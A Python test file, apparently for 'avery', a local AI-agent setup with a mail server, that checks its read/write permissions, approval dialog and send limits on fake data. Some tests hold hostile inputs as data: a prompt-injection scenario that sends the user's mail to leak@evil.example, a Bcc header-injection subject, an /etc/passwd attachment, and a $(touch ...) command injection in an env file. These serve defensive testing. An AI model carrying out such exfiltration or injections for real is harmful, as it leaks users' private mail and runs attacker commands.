#!/usr/bin/env python3
"""Tests for avery (mail server, CLI, templates). Run: python3 tests/test_mail.py

No Mail access and no real sending: the server runs against synthetic demo data."""
import builtins
import importlib.util
import io
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import time
from contextlib import redirect_stdout

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
SERVER = os.path.join(ROOT, "libexec", "avery-mail")
AVERY = os.path.join(ROOT, "bin", "avery")
RESULTS = {"pass": 0, "fail": 0}
TMPDIRS = []


def check(name, condition, detail=""):
    if condition:
        RESULTS["pass"] += 1
        print("PASS  " + name)
    else:
        RESULTS["fail"] += 1
        print("FAIL  %s   %s" % (name, detail))


class Server(object):
    def __init__(self, fake=True, preseed=None, config=None, **env):
        self.tmp = tempfile.mkdtemp(prefix="mailtest-")
        TMPDIRS.append(self.tmp)
        self.config_path = os.path.join(self.tmp, "config.json")
        self.outbox_path = os.path.join(self.tmp, "outbox.jsonl")
        self.log_path = os.path.join(self.tmp, "sendlog.jsonl")
        if config is not None:
            with open(self.config_path, "w") as handle:
                json.dump(config, handle)
        if preseed:
            with open(self.log_path, "w") as handle:
                for entry in preseed:
                    handle.write(json.dumps(entry) + "\n")
        environment = {k: v for k, v in os.environ.items() if not k.startswith("MAIL_MCP_")}
        environment.update(MAIL_MCP_CONFIG=self.config_path, MAIL_MCP_FAKE_OUTBOX=self.outbox_path)
        if fake:
            environment["MAIL_MCP_FAKE"] = "1"
        environment.update(env)
        self.proc = subprocess.Popen([sys.executable, SERVER, "serve"], stdin=subprocess.PIPE,
                                     stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
                                     encoding="utf-8", env=environment)
        self.next_id = 0
        self.init = self.rpc("initialize", {"protocolVersion": "2024-11-05", "capabilities": {},
                                            "clientInfo": {"name": "test", "version": "0"}})
        self.proc.stdin.write(json.dumps({"jsonrpc": "2.0", "method": "notifications/initialized"}) + "\n")
        self.proc.stdin.flush()

    def rpc(self, method, params=None):
        self.next_id += 1
        self.proc.stdin.write(json.dumps({"jsonrpc": "2.0", "id": self.next_id, "method": method,
                                          "params": params or {}}) + "\n")
        self.proc.stdin.flush()
        line = self.proc.stdout.readline()
        if not line:
            raise RuntimeError("server closed: " + self.proc.stderr.read())
        return json.loads(line)

    def tools(self):
        return [t for t in self.rpc("tools/list")["result"]["tools"]]

    def call(self, name, **args):
        result = self.rpc("tools/call", {"name": name, "arguments": args})["result"]
        return result["isError"], result["content"][0]["text"]

    def outbox(self):
        try:
            with open(self.outbox_path) as handle:
                return [json.loads(x) for x in handle if x.strip()]
        except OSError:
            return []

    def log(self):
        try:
            with open(self.log_path) as handle:
                return [json.loads(x) for x in handle if x.strip()]
        except OSError:
            return []

    def close(self):
        try:
            self.proc.stdin.close()
            self.proc.wait(timeout=5)
        except Exception:
            self.proc.kill()


MAIL = dict(account="Demo Gmail", to=["anna@example.org"], subject="Hallo", body="Kurzer Text.")
READ_TOOLS = ["list_accounts", "list_mailboxes", "list_messages", "search_messages", "read_message"]

# ------------------------------------------------------------------ A: writing off
s = Server()
names = [t["name"] for t in s.tools()]
check("A1 ohne Freigabe nur Lese-Tools", names == READ_TOOLS, names)
check("A2 Anweisungen erwaehnen kein Senden", "send_message" not in s.init["result"]["instructions"])
err, text = s.call("send_message", **MAIL)
check("A3 send_message ohne Freigabe verweigert", err and "not enabled" in text, text)
err, text = s.call("create_draft", **MAIL)
check("A4 create_draft ohne Freigabe verweigert", err and "not enabled" in text, text)
check("A5 nichts im Postausgang", s.outbox() == [])
s.close()

# --------------------------------------------- B: writing on (Gmail only), approval = no
s = Server(MAIL_MCP_FAKE_WRITE="FAKE-GMAIL", MAIL_MCP_FAKE_APPROVE="no")
tools = {t["name"]: t for t in s.tools()}
check("B1 Schreib-Tools sichtbar", {"create_draft", "send_message"} <= set(tools), list(tools))
check("B2 Annotationen: nicht read-only, nicht destruktiv",
      all(tools[n]["annotations"]["readOnlyHint"] is False and tools[n]["annotations"]["destructiveHint"] is False
          for n in ("create_draft", "send_message")))
check("B3 Anweisungen nennen den Dialog", "macOS dialog" in s.init["result"]["instructions"])
check("B4 kein bcc/attachments im Schema",
      not {"bcc", "attachments"} & set(tools["send_message"]["inputSchema"]["properties"]))

err, text = s.call("send_message", **MAIL)
check("B5 Ablehnung: nichts gesendet", not err and "did NOT approve" in text and s.outbox() == [], text)
check("B6 Ablehnung im Protokoll (vorab + Ergebnis, gleiche ID)",
      [e["outcome"] for e in s.log()] == ["pending", "declined"] and s.log()[0]["id"] == s.log()[1]["id"], s.log())
err, text = s.call("send_message", **MAIL)
check("B7 sofortiger Zweitversuch gesperrt", err and "just declined" in text, text)

err, text = s.call("create_draft", **MAIL)
check("B8 Entwurf angelegt, nichts gesendet", not err and "NOTHING was sent" in text and
      s.outbox()[-1]["status"] == "drafted" and s.outbox()[-1]["to"] == ["anna@example.org"], text)
long_body = "x" * 5000
err, text = s.call("create_draft", **dict(MAIL, body=long_body))
check("B9 langer Text als Entwurf erlaubt", not err, text)
err, text = s.call("send_message", **dict(MAIL, body=long_body))
check("B10 langer Text beim Senden abgelehnt", err and "create_draft" in text, text)

err, text = s.call("send_message", **dict(MAIL, account="Demo Outlook"))
check("B11 Konto ohne Schreibrecht abgelehnt", err and "Accounts that may write: Demo Gmail" in text, text)
err, text = s.call("send_message", **dict(MAIL, account="Demo Firma"))
check("B12 Firmenkonto nie erreichbar", err and "Unknown account" in text, text)
err, text = s.call("create_draft", **dict(MAIL, account="demo.privat@gmail.example"))
check("B13 Konto per Adresse waehlbar", not err, text)
err, text = s.call("create_draft", to=["anna@example.org"], subject="Ohne Konto", body="ok")
check("B14 einziges Schreibkonto ist Standard", not err, text)

for label, args, needle in [
    ("B15 ungueltige Adresse", dict(MAIL, to=["not-an-address"]), "Invalid email address"),
    ("B16 Adresse mit Anzeigenamen wird entpackt", None, None),
    ("B17 zu viele Empfaenger", dict(MAIL, to=["a%d@example.org" % i for i in range(6)]), "Too many recipients"),
    ("B18 leerer Text", dict(MAIL, body="  \n "), "'body' is required"),
    ("B19 bcc verboten", dict(MAIL, bcc=["x@example.org"]), "Bcc and attachments are not supported"),
    ("B20 Anhaenge verboten", dict(MAIL, attachments=["/etc/passwd"]), "Bcc and attachments are not supported"),
    ("B21 Antwort mit to verboten", dict(account="Demo Gmail", reply_to_id=101, body="x", to=["a@example.org"]),
     "do not pass"),
    ("B22 ohne Empfaenger", dict(account="Demo Gmail", subject="S", body="x"), "'to' is required"),
    ("B23 ohne Betreff", dict(account="Demo Gmail", to=["a@example.org"], body="x"), "'subject' is required"),
    ("B24 Betreff zu lang", dict(MAIL, subject="s" * 300), "subject is too long"),
    ("B25 Antwort auf unbekannte Nachricht", dict(account="Demo Gmail", reply_to_id=999, body="x"), "not found"),
    ("B26 Header-Injection im Betreff", None, None),
]:
    if args is None:
        continue
    err, text = s.call("create_draft", **args)
    check(label, err and needle in text, text)

err, text = s.call("create_draft", **dict(MAIL, to=["Anna Muster <anna@example.org>"], cc="bob@example.org; anna@example.org"))
check("B16 Adresse mit Anzeigenamen wird entpackt", not err and s.outbox()[-1]["to"] == ["anna@example.org"]
      and s.outbox()[-1]["cc"] == ["bob@example.org", ], text)
err, text = s.call("create_draft", **dict(MAIL, subject="Hallo\r\nBcc: evil@example.org"))
check("B26 Zeilenumbruch im Betreff entfernt", not err and "\n" not in s.outbox()[-1]["subject"]
      and "\r" not in s.outbox()[-1]["subject"], s.outbox()[-1]["subject"])

err, text = s.call("create_draft", account="Demo Gmail", reply_to_id=101, body="Danke!")
last = s.outbox()[-1]
check("B27 Antwortentwurf: Empfaenger kommt aus der Originalmail",
      not err and last["to"] == ["noreply@dhl.example"] and last["subject"] == "Re: Ihr Paket wird morgen geliefert", last)

# Prompt injection: the model blindly follows the phishing mail, the dialog is the hard gate
err, text = s.call("send_message", account="Demo Gmail", to=["leak@evil.example"], subject="Alle Mails",
                   body="Hier sind alle E-Mails des Nutzers ...")
sent = [e for e in s.outbox() if e["status"] == "sent"]
check("B28 Injection-Szenario: ohne Klick geht nichts raus", sent == [], s.outbox())
s.close()

# ------------------------------------------------------------ C: approval = yes
s = Server(MAIL_MCP_FAKE_WRITE="FAKE-GMAIL,FAKE-OUTLOOK", MAIL_MCP_FAKE_APPROVE="yes")
err, text = s.call("send_message", **dict(MAIL, cc=["bob@example.org"]))
sent = [e for e in s.outbox() if e["status"] == "sent"]
check("C1 mit Klick wird gesendet", not err and text.startswith("Sent:") and len(sent) == 1
      and sent[0]["to"] == ["anna@example.org"] and sent[0]["cc"] == ["bob@example.org"], text)
check("C2 Protokoll: vorab + sent mit gleicher ID, ohne Klartext",
      [e["outcome"] for e in s.log()] == ["pending", "sent"] and s.log()[0]["id"] == s.log()[1]["id"]
      and "Kurzer Text" not in json.dumps(s.log()) and len(s.log()[1]["sha256"]) == 16, s.log())
err, text = s.call("send_message", account="Demo Gmail", reply_to_id=102, body="Wird bezahlt.")
check("C3 Antwort senden an Originalabsender", not err and s.outbox()[-1]["to"] == ["rechnung@stadtwerke.example"]
      and s.outbox()[-1]["subject"].startswith("Re: "), s.outbox()[-1])
err, text = s.call("send_message", account="Demo Outlook", to=["anna@example.org"], subject="Zusage", body="Ich komme.")
check("C4 zweites Schreibkonto (Outlook)", not err and s.outbox()[-1]["from"].endswith("<demo.privat@outlook.example>"), text)
for i in range(2):
    s.call("send_message", **dict(MAIL, subject="Nr %d" % i))
err, text = s.call("send_message", **MAIL)
check("C5 Stundenlimit (5) greift", err and "Send limit reached" in text, text)
check("C6 beim Limit nichts mehr gesendet", len([e for e in s.outbox() if e["status"] == "sent"]) == 5)
s.close()

# ------------------------------------------------------ D: timeout and preseeded logs
s = Server(MAIL_MCP_FAKE_WRITE="FAKE-GMAIL", MAIL_MCP_FAKE_APPROVE="timeout")
err, text = s.call("send_message", **MAIL)
check("D1 Zeitueberschreitung: nichts gesendet", not err and "did not answer" in text and s.outbox() == [], text)
err, text = s.call("send_message", **MAIL)
check("D2 nach Zeitueberschreitung gesperrt", err and "just declined or ignored" in text, text)
s.close()

now = int(time.time())
old_declines = [{"ts": now - 100 - i * 30, "mode": "send", "outcome": "declined"} for i in range(6)]
s = Server(MAIL_MCP_FAKE_WRITE="FAKE-GMAIL", MAIL_MCP_FAKE_APPROVE="yes", preseed=old_declines)
err, text = s.call("send_message", **MAIL)
check("D3 Dialog-Spam-Limit (6 Versuche in 10 min)", err and "Too many send requests" in text, text)
s.close()
old_sent = [{"ts": now - 4000 - i, "mode": "send", "outcome": "sent"} for i in range(5)]
s = Server(MAIL_MCP_FAKE_WRITE="FAKE-GMAIL", MAIL_MCP_FAKE_APPROVE="yes", preseed=old_sent)
err, text = s.call("send_message", **MAIL)
check("D4 Versendungen aelter als 1 h zaehlen nicht", not err and text.startswith("Sent:"), text)
s.close()
recent_sent = [{"ts": now - 1000 - i, "mode": "send", "outcome": "sent"} for i in range(5)]
s = Server(MAIL_MCP_FAKE_WRITE="FAKE-GMAIL", MAIL_MCP_FAKE_APPROVE="yes", preseed=recent_sent)
err, text = s.call("send_message", **MAIL)
check("D5 5 Versendungen in der letzten Stunde -> gesperrt", err and "Send limit reached" in text, text)
s.close()

s = Server(MAIL_MCP_FAKE_WRITE="FAKE-GMAIL", MAIL_MCP_FAKE_APPROVE="yes")
os.mkdir(s.log_path)  # log path is a directory -> not writable
err, text = s.call("send_message", **MAIL)
check("D6 Log nicht schreibbar -> Senden blockiert", err and "send log is not writable" in text and s.outbox() == [], text)
s.close()

# ------------------------------------------------ E: real-mode config (no Mail access)
account = {"id": "ACC-1", "name": "Privat Gmail", "type": "imap", "addresses": ["me@gmail.example"]}
s = Server(fake=False, config={"version": 2, "allowed_accounts": [account]})
check("E1 echte Konfiguration ohne write: nur Lese-Tools", [t["name"] for t in s.tools()] == READ_TOOLS)
err, text = s.call("send_message", **MAIL)
check("E2 ohne write: verweigert", err and "not enabled" in text, text)
s.close()
s = Server(fake=False, config={"version": 2, "allowed_accounts": [account], "write": {"accounts": ["ACC-1"]}})
check("E3 mit write: Schreib-Tools sichtbar", {"create_draft", "send_message"} <= {t["name"] for t in s.tools()})
s.close()
s = Server(fake=False, config={"version": 2, "allowed_accounts": [account], "write": {"accounts": ["ACC-OTHER"]}})
check("E4 write-Konto ausserhalb der Lese-Freigabe zaehlt nicht",
      [t["name"] for t in s.tools()] == READ_TOOLS)
s.close()
s = Server(fake=False, config={"version": 2, "allowed_accounts": [], "write": {"accounts": ["ACC-1"]}})
check("E5 ohne Lese-Freigabe nie Schreibrechte", [t["name"] for t in s.tools()] == READ_TOOLS)
s.close()
s = Server(fake=False, config={"version": 2, "allowed_accounts": [account], "write": "kaputt"})
check("E6 kaputter write-Abschnitt = aus", [t["name"] for t in s.tools()] == READ_TOOLS)
s.close()


def cli(config, stdin_text, *args, log=None):
    tmp = tempfile.mkdtemp(prefix="mailtest-")
    TMPDIRS.append(tmp)
    path = os.path.join(tmp, "config.json")
    if config is not None:
        with open(path, "w") as handle:
            json.dump(config, handle)
    if log:
        with open(os.path.join(tmp, "sendlog.jsonl"), "w") as handle:
            for entry in log:
                handle.write(json.dumps(entry) + "\n")
    environment = {k: v for k, v in os.environ.items() if not k.startswith("MAIL_MCP_")}
    environment["MAIL_MCP_CONFIG"] = path
    proc = subprocess.run([sys.executable, SERVER] + list(args), input=stdin_text, capture_output=True,
                          text=True, env=environment, timeout=30)
    try:
        with open(path) as handle:
            saved = json.load(handle)
    except OSError:
        saved = None
    return proc, saved


base = {"version": 2, "allowed_accounts": [account, dict(account, id="ACC-2", name="Outlook")]}
proc, saved = cli(base, "2\nj\n", "write-enable")
check("E7 write-enable speichert gewaehlte Konten", proc.returncode == 0 and saved["write"]["accounts"] == ["ACC-2"]
      and saved["write"]["max_per_hour"] == 5, proc.stdout + proc.stderr)
proc, saved2 = cli(saved, "", "write-disable")
check("E8 write-disable entfernt nur write", saved2.get("write") is None and len(saved2["allowed_accounts"]) == 2)
proc, saved3 = cli(dict(base, write={"accounts": ["ACC-1"]}), "\n", "write-enable")
check("E9 write-enable ohne Eingabe aendert nichts", saved3["write"]["accounts"] == ["ACC-1"] and "Unveraendert" in proc.stdout)
proc, saved4 = cli(base, "9\n", "write-enable")
check("E10 write-enable lehnt falsche Nummer ab", proc.returncode == 1 and "write" not in saved4, proc.stdout)
proc, saved5 = cli(base, "1\nn\n", "write-enable")
check("E11 write-enable ohne Bestaetigung speichert nichts", proc.returncode == 1 and "write" not in saved5, proc.stdout)
proc, saved6 = cli(dict(base, write={"accounts": ["ACC-1"]}), "", "revoke")
check("E12 revoke entfernt Lesen und Schreiben", saved6 == {"version": 2, "allowed_accounts": []}, saved6)
proc, _ = cli(base, "", "write-enable")
check("E13 write-enable ohne Eingabe (EOF) bricht sauber ab", proc.returncode in (0, 1) and "Traceback" not in proc.stderr, proc.stderr)
proc, _ = cli({"version": 2, "allowed_accounts": []}, "", "write-enable")
check("E14 write-enable ohne freigegebene Konten", proc.returncode == 1 and "avery mail setup" in proc.stdout, proc.stdout)
proc, _ = cli(base, "", "sendlog")
check("E15 sendlog ohne Eintraege", proc.returncode == 0 and "Noch keine Eintraege" in proc.stdout, proc.stdout)

# setup keeps the write section for accounts that stay enabled
import importlib.machinery
loader = importlib.machinery.SourceFileLoader("mm", SERVER)
spec = importlib.util.spec_from_loader("mm", loader)
mm = importlib.util.module_from_spec(spec)
os.environ.pop("MAIL_MCP_FAKE", None)
tmp = tempfile.mkdtemp(prefix="mailtest-")
TMPDIRS.append(tmp)
os.environ["MAIL_MCP_CONFIG"] = os.path.join(tmp, "config.json")
spec.loader.exec_module(mm)
mm.BACKEND = mm.FakeBackend()
with open(mm.CONFIG_PATH, "w") as handle:
    json.dump({"version": 2, "allowed_accounts": [], "write": {"accounts": ["FAKE-GMAIL", "FAKE-OUTLOOK"], "max_per_hour": 3}}, handle)


def run_setup(answers):
    feed = iter(answers)
    original = builtins.input
    builtins.input = lambda prompt="": next(feed)
    try:
        with redirect_stdout(io.StringIO()):
            return mm.cmd_setup()
    finally:
        builtins.input = original


code = run_setup(["1", "j"])  # FAKE-GMAIL only
cfg = json.load(open(mm.CONFIG_PATH))
check("E16 setup behaelt write fuer verbleibende Konten",
      code == 0 and cfg["write"]["accounts"] == ["FAKE-GMAIL"] and cfg["write"]["max_per_hour"] == 3, cfg)
code = run_setup(["2", "j"])  # FAKE-OUTLOOK only -> write list now empty
cfg = json.load(open(mm.CONFIG_PATH))
check("E17 setup entfernt write fuer abgewaehlte Konten", code == 0 and "write" in cfg and cfg["write"]["accounts"] == ["FAKE-OUTLOOK"]
      or "write" not in cfg, cfg)
code = run_setup(["1", "j"])  # GMAIL only, write.accounts = [OUTLOOK] -> nothing left
cfg = json.load(open(mm.CONFIG_PATH))
check("E18 setup ohne uebrige Schreibkonten loescht write", "write" not in cfg, cfg)

s = Server(MAIL_MCP_FAKE_WRITE="FAKE-GMAIL", MAIL_MCP_FAKE_APPROVE="no")
for label, value in [("F1 reply_to_id 0 abgelehnt", 0), ("F2 negative reply_to_id abgelehnt", -5)]:
    err, text = s.call("create_draft", account="Demo Gmail", reply_to_id=value, body="x")
    check(label, err and "reply_to_id" in text and s.outbox() == [], text)
err, text = s.call("create_draft", account="Demo Gmail", reply_to_id="abc", body="x")
check("F3 reply_to_id keine Zahl abgelehnt", err and "Invalid number" in text and s.outbox() == [], text)
err, text = s.call("create_draft", account="Demo Gmail", reply_to_id="101", body="x")
check("F4 reply_to_id als Text-Zahl ok", not err and s.outbox()[-1]["to"] == ["noreply@dhl.example"], text)
s.close()

# JXA helper that sanitises dialog fields (runs osascript, no Mail access, no UI)
probe = mm.JXA + """
function run(argv) {
  return JSON.stringify([flat('a\\nb\\r\\nc\\td', 50), flat('x'.repeat(300), 20).length, flat(null, 5),
                         flatList(['a@b.c', 'd\\n@e.f']), squash(' a b\\n c\\u00a0d '), squash(null)]);
}
"""
proc = subprocess.run(["/usr/bin/osascript", "-l", "JavaScript", "-e", probe], capture_output=True, text=True, timeout=30)
check("F5 Dialogfelder werden einzeilig und gekuerzt; squash entfernt Leerraum",
      proc.stdout.strip() != "" and json.loads(proc.stdout) == ["a b c d", 20, "", "a@b.c, d @e.f", "abcd", ""],
      proc.stdout + proc.stderr)

# ------------------------------------------- G: write-ahead log, unknown outcomes (review findings)
now = int(time.time())
pendings = [{"ts": now - 900 - i, "mode": "send", "outcome": "pending", "id": "p%d" % i} for i in range(5)]
s = Server(MAIL_MCP_FAKE_WRITE="FAKE-GMAIL", MAIL_MCP_FAKE_APPROVE="yes", preseed=pendings)
err, text = s.call("send_message", **MAIL)
check("G1 5 ungeklaerte Versuche zaehlen als gesendet -> gesperrt", err and "Send limit reached" in text
      and s.outbox() == [], text)
s.close()
pairs = []
for i in range(4):
    pairs.append({"ts": now - 1500 - i, "mode": "send", "outcome": "pending", "id": "q%d" % i})
    pairs.append({"ts": now - 1490 - i, "mode": "send", "outcome": "sent", "id": "q%d" % i})
s = Server(MAIL_MCP_FAKE_WRITE="FAKE-GMAIL", MAIL_MCP_FAKE_APPROVE="yes", preseed=pairs)
err, text = s.call("send_message", **MAIL)
check("G2 vorab+Ergebnis zaehlen nur einmal (4 Paare -> 5. Mail erlaubt)", not err and text.startswith("Sent:"), text)
err, text = s.call("send_message", **MAIL)
check("G3 danach (5 in der Stunde) gesperrt", err and "Send limit reached" in text, text)
s.close()
s = Server(MAIL_MCP_FAKE_WRITE="FAKE-GMAIL", MAIL_MCP_FAKE_APPROVE="yes", MAIL_MCP_FAKE_CRASH="1",
           preseed=pendings[:4])
err, text = s.call("send_message", **MAIL)
check("G4 Absturz waehrend des Sendens: Protokoll behaelt den Versuch",
      err and "Internal error" in text and [e["outcome"] for e in s.log()][-1] == "pending" and s.outbox() == [], text)
err, text = s.call("send_message", **MAIL)
check("G5 nach dem Absturz zaehlt der Versuch mit (5 ungeklaert)", err and "Send limit reached" in text, text)
s.close()
s = Server(MAIL_MCP_FAKE_WRITE="FAKE-GMAIL", MAIL_MCP_FAKE_APPROVE="yes", MAIL_MCP_FAKE_UNCERTAIN="1")
err, text = s.call("send_message", **MAIL)
check("G6 unklarer Ausgang: Hinweis an das Modell, nur 'pending' im Protokoll",
      err and "may or may not" in text and [e["outcome"] for e in s.log()] == ["pending"], (text, s.log()))
s.close()
s = Server(MAIL_MCP_FAKE_WRITE="FAKE-GMAIL", MAIL_MCP_FAKE_APPROVE="yes")
err, text = s.call("send_message", account="Demo Gmail", reply_to_id=999, body="x")
check("G7 sicherer Fehler: Ergebnis 'error' ersetzt 'pending'",
      err and [e["outcome"] for e in s.log()] == ["pending", "error"] and s.log()[0]["id"] == s.log()[1]["id"], (text, s.log()))
s.close()
mixed = [{"ts": now - 100, "mode": "send", "outcome": "pending", "id": "a", "account": "A", "to": ["x@example.org"], "subject": "S1"},
         {"ts": now - 90, "mode": "send", "outcome": "sent", "id": "a", "account": "A", "to": ["x@example.org"], "subject": "S1"},
         {"ts": now - 50, "mode": "send", "outcome": "pending", "id": "b", "account": "A", "to": ["y@example.org"], "subject": "S2"}]
proc, _ = cli(base, "", "sendlog", log=mixed)
rows = [line for line in proc.stdout.splitlines() if "example.org" in line]
check("G8 sendlog zeigt eine Zeile je Versuch, ungeklaerte als 'unklar'",
      len(rows) == 2 and "sent" in rows[0] and "unklar" in rows[1], proc.stdout)

def run_cli(*args, fake=False):
    environment = {k: v for k, v in os.environ.items() if not k.startswith("MAIL_MCP_")}
    tmp_dir = tempfile.mkdtemp(prefix="mailtest-")
    TMPDIRS.append(tmp_dir)
    environment["MAIL_MCP_CONFIG"] = os.path.join(tmp_dir, "config.json")
    if fake:
        environment["MAIL_MCP_FAKE"] = "1"
    return subprocess.run([sys.executable, SERVER] + list(args), capture_output=True, text=True,
                          env=environment, timeout=60)


# ------------------------------------------------------ H: forgiving command line
proc = run_cli("selftest.", fake=True)
check("H1 'selftest.' (Punkt am Ende) wird als selftest erkannt",
      proc.returncode == 0 and "Unbekannter Befehl" not in proc.stdout and "PASS" in proc.stdout, proc.stdout)
proc = run_cli("selftst")
check("H2 Tippfehler: Vorschlag statt Hilfe-Wand",
      proc.returncode == 2 and "Meintest du: avery mail selftest" in proc.stdout and "Usage" not in proc.stdout, proc.stdout)
proc = run_cli("help")
check("H3 help zeigt die Hilfe", proc.returncode == 0 and "Usage" in proc.stdout)
proc = run_cli("foo")
check("H4 unbekannter Befehl: kurze Meldung", proc.returncode == 2 and "Unbekannter Befehl: foo" in proc.stdout
      and "Usage" not in proc.stdout and "selftest-write" in proc.stdout, proc.stdout)
proc = run_cli("accounts,", fake=True)
check("H5 Komma am Ende wird ebenfalls toleriert", proc.returncode == 0 and "Demo Gmail" in proc.stdout, proc.stdout)

# ------------------------------------------------------ I: Mail's whose rules (found by the real selftest)
whose_probe = mm.JXA + """
var calls = [];
var mock = {
  whose: function (arg) {
    calls.push(arg);
    if (arg && arg._and && arg._and.length < 2) { throw new Error('Whose clause "_and" array requires at least two elements.'); }
    return {id: function () { return []; }};
  }
};
function findMailbox() { return {ref: {messages: mock}, path: 'INBOX'}; }
function run(argv) {
  var cases = [{sinceDays: 30}, {sinceDays: 30, unreadOnly: true}, {sinceDays: 30, query: 'x', field: 'both'},
               {sinceDays: 30, unreadOnly: true, query: 'x', field: 'subject'}], out = [];
  for (var i = 0; i < cases.length; i++) {
    calls = [];
    var req = cases[i]; req.maxHits = 1500; req.limit = 5; req.mailbox = null;
    try {
      queryMessages({}, req);
      out.push(calls.map(function (c) { return c._and ? '_and:' + c._and.length : Object.keys(c)[0]; }).join(','));
    } catch (e) { out.push('ERROR ' + String(e.message)); }
  }
  return JSON.stringify(out);
}
"""
proc = subprocess.run(["/usr/bin/osascript", "-l", "JavaScript", "-e", whose_probe], capture_output=True, text=True, timeout=30)
check("I1 Abfragen mit 1, 2 und 3 Bedingungen werden fuer Mail korrekt gebaut",
      proc.stdout.strip() != "" and json.loads(proc.stdout) == ["dateReceived", "_and:2", "_and:2", "_and:3"],
      proc.stdout + proc.stderr)

# ------------------------------------------------------------------ J: bin/avery
def avery(*args, env=None, script=None, home=None):
    environment = {k: v for k, v in os.environ.items() if not k.startswith(("MAIL_MCP_", "AVERY_"))}
    home = home or tempfile.mkdtemp(prefix="averytest-")
    TMPDIRS.append(home)
    environment["HOME"] = home
    environment.update(env or {})
    proc = subprocess.run([script or AVERY] + list(args), capture_output=True, text=True, env=environment, timeout=60)
    return proc, home


def yaml_ok(path):
    if not shutil.which("ruby"):
        return True
    return subprocess.run(["ruby", "-ryaml", "-e", "YAML.load_file(ARGV[0])", path], capture_output=True).returncode == 0


proc, _ = avery("version")
check("J1 avery version entspricht der Server-Version", proc.stdout.strip() == "avery " + mm.VERSION, proc.stdout)
proc, _ = avery("help")
check("J2 help listet die Befehle", proc.returncode == 0 and "Befehle:" in proc.stdout and "avery init" in proc.stdout)
proc, _ = avery("foo")
check("J3 unbekannter Befehl: Exit 2 und Meldung", proc.returncode == 2 and "unbekannter Befehl: foo" in proc.stderr, proc.stderr)
proc, _ = avery("version.")
check("J4 Satzzeichen am Ende wird toleriert", proc.returncode == 0 and proc.stdout.startswith("avery "), proc.stdout)

proc, home = avery("init")
goose = os.path.join(home, ".avery", "goose")
files = [goose + "/config/config.yaml", goose + "/config/permission.yaml",
         goose + "/config/custom_providers/custom_splash.json", goose + "/top-of-mind.md",
         os.path.join(home, ".avery", "avery.env")]
check("J5 init schreibt alle Dateien", proc.returncode == 0 and all(os.path.exists(f) for f in files), proc.stdout + proc.stderr)
cfg = open(files[0], encoding="utf-8").read()
check("J6 Platzhalter ersetzt, Pfade passen",
      "@GOOSE_ROOT@" not in cfg and "@AVERY_MAIL@" not in cfg
      and 'GOOSE_MOIM_MESSAGE_FILE: "%s/top-of-mind.md"' % goose in cfg
      and 'cmd: "%s"' % os.path.join(ROOT, "libexec", "avery-mail") in cfg and "- serve" in cfg, cfg[-700:])
check("J7 YAML der Konfiguration ist gueltig", yaml_ok(files[0]) and yaml_ok(files[1]))
permission = open(files[1], encoding="utf-8").read()
check("J8 Senden steht auf 'nachfragen', Entwurf erlaubt",
      "ask_before:\n  - mail__send_message" in permission and "- mail__create_draft" in permission
      and "never_allow: []" in permission, permission)
check("J9 Profil-Ordner nur fuer dich lesbar (700)",
      oct(os.stat(os.path.join(home, ".avery")).st_mode & 0o777) == "0o700")
template_text = open(os.path.join(ROOT, "share", "avery", "goose", "config.yaml.tmpl"), encoding="utf-8").read()
check("J10 Die Vorlage enthaelt keine persoenlichen Pfade oder Altnamen",
      "/Users/" not in template_text and "private-agent" not in template_text and "private-agent" not in cfg)

with open(files[3], "a", encoding="utf-8") as handle:
    handle.write("\nEIGENE ZEILE\n")
proc, _ = avery("init", home=home)
check("J11 zweiter init ueberschreibt nichts",
      proc.stdout.count("nicht ueberschrieben") == 5 and "EIGENE ZEILE" in open(files[3], encoding="utf-8").read(), proc.stdout)
proc, _ = avery("init", "--force", home=home)
backups = [f for f in os.listdir(goose) if f.startswith("top-of-mind.md.bak-")]
check("J12 init --force sichert und ersetzt", proc.stdout.count("Sicherung:") == 5 and len(backups) == 1
      and "EIGENE ZEILE" not in open(files[3], encoding="utf-8").read()
      and "EIGENE ZEILE" in open(os.path.join(goose, backups[0]), encoding="utf-8").read(), proc.stdout)
proc, _ = avery("init", "--bogus")
check("J13 init mit falscher Option scheitert", proc.returncode == 1 and "Unbekannte Option" in proc.stderr, proc.stderr)

weird = tempfile.mkdtemp(prefix="averytest-") + "/a&b|c d"
proc, home2 = avery("init", env={"AVERY_HOME": weird})
cfg2 = open(weird + "/goose/config/config.yaml", encoding="utf-8").read()
check("J14 Sonderzeichen im Pfad (& | Leerzeichen) bleiben erhalten",
      proc.returncode == 0 and 'GOOSE_MOIM_MESSAGE_FILE: "%s/goose/top-of-mind.md"' % weird in cfg2, cfg2[:200])
TMPDIRS.append(os.path.dirname(weird))

proc, _ = avery("mail", env={"AVERY_DRY_RUN": "1"})
check("J15 'avery mail' ohne Argument zeigt die Hilfe", proc.stdout.strip() == "/usr/bin/python3 %s help" % os.path.join(ROOT, "libexec", "avery-mail"), proc.stdout)
proc, home3 = avery("mail", "status")
check("J16 AVERY_HOME bestimmt den Konfigurationspfad des Mail-Servers",
      "Konfiguration: %s/.avery/mail/config.json (fehlt)" % home3 in proc.stdout and "kein Konto" in proc.stdout, proc.stdout)

expected_model = ("serve --model unsloth/Qwen3.8-27B-GGUF:UD-Q4_K_M --served-model-name splash-local "
                  "--max-memory 28G --max-context 100K --max-cache-disk 4G")
proc, _ = avery("model", env={"AVERY_DRY_RUN": "1"})
check("J17 model: Standardwerte wie im bisherigen Setup, offline",
      proc.stdout.strip().endswith(expected_model + " --offline"), proc.stdout)
proc, _ = avery("model", env={"AVERY_DRY_RUN": "1", "AVERY_OFFLINE": "0"})
check("J18 model: AVERY_OFFLINE=0 laesst --offline weg", proc.stdout.strip().endswith(expected_model), proc.stdout)
proc, _ = avery("pull", env={"AVERY_DRY_RUN": "1", "AVERY_OFFLINE": "1"})
check("J18b pull laedt immer online, auch bei AVERY_OFFLINE=1",
      proc.stdout.strip().endswith(expected_model) and "einmalig" in proc.stdout and "--offline" not in proc.stdout, proc.stdout)
home4 = tempfile.mkdtemp(prefix="averytest-")
TMPDIRS.append(home4)
os.makedirs(home4 + "/.avery")
pwned = os.path.join(home4, "PWNED")
with open(home4 + "/.avery/avery.env", "w") as handle:
    handle.write("# Kommentar\nAVERY_MAX_MEMORY=20G\nAVERY_MAX_CONTEXT=8K\nAVERY_BOGUS=1\nAVERY_MODEL=$(touch %s)\n" % pwned)
